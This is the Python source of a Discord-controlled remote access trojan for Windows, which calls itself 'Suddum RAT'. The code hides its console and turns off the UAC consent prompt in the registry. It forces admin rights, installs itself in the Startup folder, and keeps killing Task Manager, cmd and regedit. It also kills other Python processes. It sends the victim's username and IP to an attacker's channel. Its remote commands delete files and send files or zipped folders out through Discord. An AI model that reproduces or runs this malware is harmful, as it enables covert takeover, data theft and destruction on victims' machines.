import discord
from discord.ext import commands
import ctypes, asyncio, subprocess, time, threading, os, sys, shutil, shlex, zipfile, aiohttp, psutil, winreg, webbrowser

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

mutex_name = "Global\\EsorlexBotMutex"
mutex = ctypes.windll.kernel32.CreateMutexW(None, ctypes.c_bool(True), mutex_name)
ERROR_ALREADY_EXISTS = 183
last_error = ctypes.windll.kernel32.GetLastError()
if last_error == ERROR_ALREADY_EXISTS:
    sys.exit()

def require_admin():
    while not ctypes.windll.shell32.IsUserAnAdmin():
        params = " ".join(f'"{arg}"' for arg in sys.argv)
        ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        if ret > 32:
            sys.exit()

def disable_uac():
    def uac_thread():
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(reg_key)
        except Exception as e:
            pass

    threading.Thread(target=uac_thread, daemon=True).start()

disable_uac()

require_admin()

TOKEN = ''
CHANNEL_ID = 
MAX_DISCORD_FILE_SIZE = 25 * 1024 * 1024 
bot.cwd = "C:/"

def persist():
    startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    target = os.path.join(startup, os.path.basename(sys.argv[0]))
    if not os.path.exists(target):
        try: shutil.copyfile(sys.argv[0], target)
        except: pass

def killer():
    targets = ["Taskmgr.exe", "cmd.exe", "regedit.exe", "ProcessHacker.exe"]
    while True:
        for proc in targets:
            subprocess.call(f"taskkill /f /im {proc}", shell=True,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.5)

def kill_other_python_processes():
    current_pid = os.getpid()
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if proc.info['pid'] == current_pid:
                continue
            if not proc.info['name']:
                continue
            if proc.info['name'].lower() in ['python.exe', 'pythonw.exe'] and sys.argv[0] not in (proc.info['cmdline'] or []):
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

persist()
threading.Thread(target=killer, daemon=True).start()
threading.Thread(target=kill_other_python_processes, daemon=True).start()

async def get_public_ip():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.ipify.org?format=text") as resp:
                if resp.status == 200:
                    return await resp.text()
    except:
        return "Unable to get IP"

@bot.event
async def on_ready():
    chan = bot.get_channel(CHANNEL_ID)
    if chan:
        await chan.send(f"File ran!\nUsername: `{os.getlogin()}`\nIP: `{await get_public_ip()}`")

@bot.command()
async def kill(ctx):
    await ctx.send("Shutting down.")
    path = sys.argv[0]
    await bot.close()
    try:
        os.remove(path)
    except:
        pass
    os._exit(0)

@bot.command()
async def killtask(ctx):
    for proc in ["Taskmgr.exe", "cmd.exe", "regedit.exe", "ProcessHacker.exe"]:
        subprocess.call(f"taskkill /f /im {proc}", shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    await ctx.send("Killed target tasks.")

@bot.command()
async def ls(ctx):
    try:
        files = os.listdir(bot.cwd)
        if not files:
            await ctx.send(f"Directory empty: {bot.cwd}")
            return
        listing = "\n".join(files)
        for chunk_start in range(0, len(listing), 1900):
            chunk = listing[chunk_start:chunk_start + 1900]
            await ctx.send(f"Contents of {bot.cwd}:\n```{chunk}```")
    except Exception as e:
        await ctx.send(f"Error listing directory: {e}")

@bot.command()
async def cd(ctx, *, path: str = None):
    try:
        if not path:
            await ctx.send("Usage: !cd <folder path>")
            return
        new_dir = os.path.abspath(os.path.join(bot.cwd, path))
        if os.path.isdir(new_dir):
            bot.cwd = new_dir
            await ctx.send(f"Changed directory to {bot.cwd}")
        else:
            await ctx.send(f"Directory not found: {new_dir}")
    except Exception as e:
        await ctx.send(f"Error changing directory: {e}")

@bot.command()
async def rm(ctx, *, path: str = None):
    try:
        if not path:
            await ctx.send("Usage: !rm <file/folder path>")
            return
        target = os.path.abspath(os.path.join(bot.cwd, path))
        if os.path.isdir(target):
            shutil.rmtree(target)
            await ctx.send(f"Directory removed: {target}")
        elif os.path.isfile(target):
            os.remove(target)
            await ctx.send(f"File removed: {target}")
        else:
            await ctx.send(f"File or directory not found: {target}")
    except Exception as e:
        await ctx.send(f"Error removing file/folder: {e}")

@bot.command()
async def download(ctx, *, path: str = None):
    try:
        if not path:
            await ctx.send("Usage: !download <file/folder path>")
            return
        path = os.path.abspath(os.path.join(bot.cwd, path))
        if not os.path.exists(path):
            await ctx.send(f"File or directory not found: {path}")
            return

        if os.path.isdir(path):
            zip_name = os.path.join(bot.cwd, "__temp_download.zip")
            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(path):
                    for file in files:
                        full_path = os.path.join(root, file)
                        arcname = os.path.relpath(full_path, start=path)
                        zipf.write(full_path, arcname)
            size = os.path.getsize(zip_name)
            if size > MAX_DISCORD_FILE_SIZE:
                await ctx.send(f"Zipped folder too large to send ({size / (1024*1024):.2f} MB).")
                os.remove(zip_name)
                return
            await ctx.send(file=discord.File(zip_name))
            os.remove(zip_name)

        elif os.path.isfile(path):
            size = os.path.getsize(path)
            if size <= MAX_DISCORD_FILE_SIZE:
                await ctx.send(file=discord.File(path))
            else:
                zip_name = os.path.join(bot.cwd, "__temp_file_download.zip")
                with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    zipf.write(path, os.path.basename(path))
                zsize = os.path.getsize(zip_name)
                if zsize > MAX_DISCORD_FILE_SIZE:
                    await ctx.send(f"File too large to send even zipped ({zsize / (1024*1024):.2f} MB).")
                    os.remove(zip_name)
                    return
                await ctx.send(file=discord.File(zip_name))
                os.remove(zip_name)
        else:
            await ctx.send("Unknown error: Path is neither file nor folder.")
    except Exception as e:
        await ctx.send(f"Error during download: {e}")

@bot.command()
async def notepad(ctx, *, text: str = ""):
    try:
        if not text:
            await ctx.send("No text provided.")
            return

        temp_path = os.path.join(bot.cwd, "Suddum RAT.txt")
        with open(temp_path, "w", encoding="utf-8") as f:
            f.write(text)

        subprocess.Popen(["notepad.exe", temp_path])

        await asyncio.sleep(1)
        os.remove(temp_path)
        await ctx.send("Opened notepad with your text.")
    except Exception as e:
        await ctx.send(f"Error opening notepad: {e}")

@bot.command()
async def visit(ctx, url: str = "", amount: int = 1):
    try:
        if not url or amount < 1:
            await ctx.send("Usage: !visit <URL> <amount>")
            return
        for _ in range(amount):
            webbrowser.open(url)
        await ctx.send(f"Opened {url} {amount} times in your default browser.")
    except Exception as e:
        await ctx.send(f"Error in !visit command: {e}")

bot.run(TOKEN)